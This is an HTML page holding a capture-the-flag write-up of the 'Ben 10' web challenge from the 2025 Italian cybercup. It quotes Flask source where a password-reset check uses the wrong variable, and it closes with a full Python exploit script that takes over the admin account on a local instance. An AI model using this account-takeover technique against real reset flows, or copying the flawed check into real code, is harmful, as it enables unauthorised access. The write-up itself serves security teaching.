               

<!DOCTYPE html>
<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    

    <title>Ben 10 - ByteTheCookies</title>

    

    

    
    <meta name="author" content="ByteTheCookies" />
    

    
        <meta property="og:title" content="Ben 10" />
<meta property="og:description" content="Ben 10 Description: Ben Tennyson&rsquo;s Omnitrix holds a mysterious and powerful form called Materia Grigia ‚Äî a creature that only those with the sharpest minds can access. It&rsquo;s hidden deep within the system, waiting for someone clever enough to unlock it. Only the smartest can access what‚Äôs truly hidden.
Can you outsmart the system and reveal the flag?
Introduction This is one of the webs of the 2025 italian championship cybercup first round, the ctf was made in january 2025, and I&rsquo;m writing the writeups only so some information could be wrong or not complete." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/writeups/srdnlen2025/ben10/" /><meta property="article:section" content="writeups" />
<meta property="article:published_time" content="2025-03-11T16:52:02+01:00" />
<meta property="article:modified_time" content="2025-03-11T18:29:57+01:00" />


    

    
        <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Ben 10"/>
<meta name="twitter:description" content="Ben 10 Description: Ben Tennyson&rsquo;s Omnitrix holds a mysterious and powerful form called Materia Grigia ‚Äî a creature that only those with the sharpest minds can access. It&rsquo;s hidden deep within the system, waiting for someone clever enough to unlock it. Only the smartest can access what‚Äôs truly hidden.
Can you outsmart the system and reveal the flag?
Introduction This is one of the webs of the 2025 italian championship cybercup first round, the ctf was made in january 2025, and I&rsquo;m writing the writeups only so some information could be wrong or not complete."/>
<meta name="twitter:site" content="@ByteTheCookies"/>

    <link rel="stylesheet" href="/style.css" integrity="">



    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">



    
        <script
  id="MathJax-script"
  async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"
></script>
<script>
  MathJax = {
    tex: {
      displayMath: [
        ["\\[", "\\]"],
        ["$$", "$$"],
      ], 
      inlineMath: [
        ["\\(", "\\)"],
        ["$", "$"],
      ], 
    },
  };
</script>

    

    
    <script>
        if (!('theme' in localStorage)) {
            localStorage.theme = 'dark';
        }

        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
            document.documentElement.setAttribute("data-theme", "dark");
        } else {
            document.documentElement.setAttribute("data-theme", "light");
        }
    </script>
<script defer src="/js/header.js" integrity=""></script>



    <script defer src="/js/zooming.js" integrity=""></script>







    
        

        
        

        
        
            
        

        <script defer src="/js/prism.js" integrity="" data-manual></script>
    



    
    
    
    <script defer src="/js/search-en.js" integrity=""></script>




<link rel="stylesheet" href="http://localhost:1313/user.css">

    

</head>
<body><header>
    <div id="header_left">
        <div id="sidebar_btn">
            <input type="checkbox" id="sidebar_btn_input" class="hidden" />
            <label id="sidebar_btn_label" for="sidebar_btn_input">
                <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
</svg>

</svg>
            </label>
            <label id="sidebar_canvas_overlay_wrapper" for="sidebar_btn_input">
                <div id="sidebar_canvas_overlay"></div>
            </label>
            <div id="sidebar">
                <ul><li>
                            <a href="/">üíª About</a></li><li>
                            <a href="/news/">üì∞ News</a></li><li>
                            <a href="/writeups/">üìë Writeups</a></li><li>
                            <a href="/contacts/">‚úâÔ∏è Contacts</a></li></ul>
            </div>
        </div>
    
        <div class="brand">
            <div>
                <a href="/">ByteTheCookies</a>
            </div>
        </div>
    </div>

    <div class="toolbox">
        <div id="theme_tool">
            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
</svg>

</svg>
            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
</svg>

</svg>
        </div>

        
            <div id="search_tool">
                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
</svg>

</svg><div id="search_menu_wrapper" class="hidden">
    <div id="search_menu">
        <div id="search_menu_toolbar">
            <div id="search_menu_input_wrapper">
                <input id="search_menu_input" type="text" placeholder='Search Posts'>
            </div>
            <div id="search_menu_close_btn">
                <svg width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
</svg>

</svg>
            </div>
        </div>
        <div id="search_menu_results">
        </div>
    </div>
</div>
</div>
        

        
    </div>
</header>
<nav id="navbar" class="pure-menu">
    <ul class="pure-menu-list"><li class="navbar-item pure-menu-item ">
                    
                        <a href="/" class="pure-menu-link">üíª About</a>
                    
                </li><li class="navbar-item pure-menu-item ">
                    
                        <a href="/news/" class="pure-menu-link">üì∞ News</a>
                    
                </li><li class="navbar-item pure-menu-item insection">
                    
                        <a href="/writeups/" class="pure-menu-link">üìë Writeups</a>
                    
                </li><li class="navbar-item pure-menu-item ">
                    
                        <a href="/contacts/" class="pure-menu-link">‚úâÔ∏è Contacts</a>
                    
                </li></ul>
</nav>
<main>
      <div id="content" class="content-margin">
        
    
    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
        
            <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#source">Source</a></li>
    <li><a href="#solution">Solution</a></li>
  </ul>
</nav>
        
    </div></details>



<div class="tags">
  
    <div class="badge">Web</div>

  
    <div class="badge">Python</div>

  
    <div class="badge">Business logic vulnerability</div>

  
    <div class="badge">gheddus</div>

  
</div>

<div>
  <p class="date">
    Last edit: Mar 11, 2025
  </p>
</div>


    <div class="content-margin">



<article >
    
    
        
        
    
    <h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>Ben 10</h1>
<p><strong>Description</strong>: Ben Tennyson&rsquo;s Omnitrix holds a mysterious and powerful form called Materia Grigia ‚Äî a creature that only those with the sharpest minds can access. It&rsquo;s hidden deep within the system, waiting for someone clever enough to unlock it. Only the smartest can access what‚Äôs truly hidden.</p>
<p>Can you outsmart the system and reveal the flag?</p>

<h2 id="introduction" class="header-anchor-wrapper">Introduction
  <a href="#introduction" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h2>

<p>This is one of the webs of the 2025 italian championship cybercup first round, the ctf was made in january 2025, and I&rsquo;m writing the writeups only so some information could be wrong or not complete.</p>
<p>The challenge is presented in a very clear and simple way, we have in front of us a login form and one to register, once logged in we see we are shown several photos of the different aliens of ben10.</p>
<p><img alt="screen" src="/images/ben10/img1.png"></p>
<p>When we try to click on each alien, it just opens another screen with details, until the last one hides information that only the admin can see.</p>
<p><img alt="screen" src="/images/ben10/img2.png"></p>
<p>From here I would say that a look at the code would not hurt.</p>

<h2 id="source" class="header-anchor-wrapper">Source
  <a href="#source" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h2>

<p>Analysing the code, we see that the admin is created at the same time as the user, so each user has their own randomly generated admin.</p>
<pre  class="mc-prism hide language-text" ><code class="language-python">    admin_username = f&quot;admin^{username}^{secrets.token_hex(5)}&quot;
    admin_password = secrets.token_hex(8)
</code></pre>
<p>And as you can see, the admin username is associated with the user created.</p>
<pre  class="mc-prism hide language-text" ><code class="language-python">    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute(&quot;INSERT INTO users (username, password, admin_username) VALUES (?, ?, ?)&quot;,(username, password, admin_username))
    cursor.execute(&quot;INSERT INTO users (username, password, admin_username) VALUES (?, ?, ?)&quot;,(admin_username, admin_password, None))
    conn.commit()
</code></pre>
<p>So the first problem is to understand how to find the name of our admin. But fortunately, it&rsquo;s quite simple, because we see that it&rsquo;s simply inserted into a template, and therefore probably somewhere in the HTML when rendered.</p>
<pre  class="mc-prism hide language-text" ><code class="language-python">return render_template('home.html', username=username, admin_username=admin_username, image_names=image_names)
</code></pre>
<pre  class="mc-prism hide language-text" ><code class="language-html">{% extends &quot;base.html&quot; %}

{% block content %}
    &lt;h1&gt;Welcome, {{ username }}&lt;/h1&gt;
    &lt;h2&gt;Do you like the aliens on my Omnitrix?&lt;/h2&gt;

    &lt;!-- secret admin username --&gt;
    &lt;div style=&quot;display:none;&quot; id=&quot;admin_data&quot;&gt;{{ admin_username }}&lt;/div&gt;

    &lt;div id=&quot;image-grid&quot;&gt;
        {% for image_name in image_names %}
            &lt;div&gt;
                &lt;img src=&quot;{{ url_for('static', filename='images/' + image_name + '.webp') }}&quot; alt=&quot;{{ image_name }}&quot;
                    onclick=&quot;window.location.href='/image/{{ image_name }}'&quot; style=&quot;cursor:pointer;&quot;&gt;
            &lt;/div&gt;
        {% endfor %}
    &lt;/div&gt;

    &lt;a href=&quot;{{ url_for('logout') }}&quot; style=&quot;margin-top: 20px; display: block;&quot;&gt;Logout&lt;/a&gt;
{% endblock %}
</code></pre>
<p>So the first problem is solved&hellip;</p>
<p>The second is to find out how to access the secret image, with the aim of logging in as admin. To do this, we go back to analysing the source code.</p>
<p>Among the various endpoints, we find <code>/reset_password</code> and <code>/forgot_password</code>.</p>
<p>The former allows us to generate a reset token to be used in <code>/forgot_password</code> to change the user&rsquo;s password.</p>
<pre  class="mc-prism hide language-text" ><code class="language-python">@app.route('/reset_password', methods=['GET', 'POST'])
def reset_password():
    &quot;&quot;&quot;Handle reset password request.&quot;&quot;&quot;
    if request.method == 'POST':
        username = request.form['username']

        if username.startswith('admin'):
            flash(&quot;Admin users cannot request a reset token.&quot;, &quot;error&quot;)
            return render_template('reset_password.html')

        if not get_user_by_username(username):
            flash(&quot;Username not found.&quot;, &quot;error&quot;)
            return render_template('reset_password.html')

        reset_token = secrets.token_urlsafe(16)
        update_reset_token(username, reset_token)

        flash(&quot;Reset token generated!&quot;, &quot;success&quot;)
        return render_template('reset_password.html', reset_token=reset_token)

    return render_template('reset_password.html')


@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
    &quot;&quot;&quot;Handle password reset.&quot;&quot;&quot;
    if request.method == 'POST':
        username = request.form['username']
        reset_token = request.form['reset_token']
        new_password = request.form['new_password']
        confirm_password = request.form['confirm_password']

        if new_password != confirm_password:
            flash(&quot;Passwords do not match.&quot;, &quot;error&quot;)
            return render_template('forgot_password.html', reset_token=reset_token)

        user = get_user_by_username(username)
        if not user:
            flash(&quot;User not found.&quot;, &quot;error&quot;)
            return render_template('forgot_password.html', reset_token=reset_token)

        if not username.startswith('admin'):
            token = get_reset_token_for_user(username)
            if token and token[0] == reset_token:
                update_password(username, new_password)
                flash(f&quot;Password reset successfully.&quot;, &quot;success&quot;)
                return redirect(url_for('login'))
            else:
                flash(&quot;Invalid reset token for user.&quot;, &quot;error&quot;)
        else:
            username = username.split('^')[1]
            token = get_reset_token_for_user(username)
            if token and token[0] == reset_token:
                update_password(request.form['username'], new_password)
                flash(f&quot;Password reset successfully.&quot;, &quot;success&quot;)
                return redirect(url_for('login'))
            else:
                flash(&quot;Invalid reset token for user.&quot;, &quot;error&quot;)

    return render_template('forgot_password.html', reset_token=request.args.get('token'))
</code></pre>
<p>The problem here is on line 183, where instead of using <code>username</code> it uses <code>request.form['username']</code>, and this causes a big problem because now you can just use the normal user&rsquo;s token to reset the admin&rsquo;s password.</p>

<h2 id="solution" class="header-anchor-wrapper">Solution
  <a href="#solution" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h2>

<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: exploit.py

#!/usr/bin/python3
import random
import string

import requests
from bs4 import BeautifulSoup

BASE_URL = &quot;http://localhost:5000/&quot;

s = requests.Session()

def string_generator(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def login(username, password):
    data = {
        &quot;username&quot;: username,
        &quot;password&quot;: password
    }
    r = s.post(f&quot;{BASE_URL}/login&quot;, data=data)
    return r.status_code == 200

def register(username, password):
    data = {
        &quot;username&quot;: username,
        &quot;password&quot;: password
    }
    r = s.post(f&quot;{BASE_URL}/register&quot;, data=data)
    return r.status_code == 200

def get_admin():
    r = s.get(BASE_URL)
    soup = BeautifulSoup(r.text, 'html.parser')
    admin_username = soup.find('div', {'id': 'admin_data'}).text.strip()
    print(&quot;[+] Admin Username:&quot;, admin_username)
    return admin_username

def get_reset_token(username):
    r = s.post(f&quot;{BASE_URL}/reset_password&quot;,data={&quot;username&quot;: username})
    soup = BeautifulSoup(r.text, 'html.parser')
    token = soup.find('strong').text.strip()
    return token

def exploit(username_admin,token):
    data = {
        &quot;username&quot;: username_admin,
        &quot;reset_token&quot;: token,
        &quot;new_password&quot;: &quot;cookieforme&quot;,
        &quot;confirm_password&quot;: &quot;cookieforme&quot;
    }
    r = s.post(f&quot;{BASE_URL}/forgot_password&quot;, data=data)
    if r.status_code == 200:
        print(&quot;[+] Generated new password!&quot;)
    else:
        print(&quot;[!] Failed to generate new password&quot;)
        return

    if login(username_admin, &quot;cookieforme&quot;):
        print(&quot;[+] Logged in as admin!&quot;)
    else:
        print(&quot;[!] Failed to login as admin&quot;)
        return

    return s.get(f&quot;{BASE_URL}/image/ben10&quot;).text

def main():
    username = string_generator(10)
    password = string_generator(10)
    register(username, password)
    login(username, password)
    username_admin = get_admin()
    token = get_reset_token(username)
    print(exploit(username_admin,token))


if __name__ == &quot;__main__&quot;:
	main()


# goodluck by @akiidjk
</code></pre>
<p align='right'>Author: akiidjk </p>

</article>
</div>
   
      </div>
    </main>
<footer>
    <article>Copyright ¬© 2024 by ByteTheCookies Team | v1.0</article>
</footer>

</body>
</html>
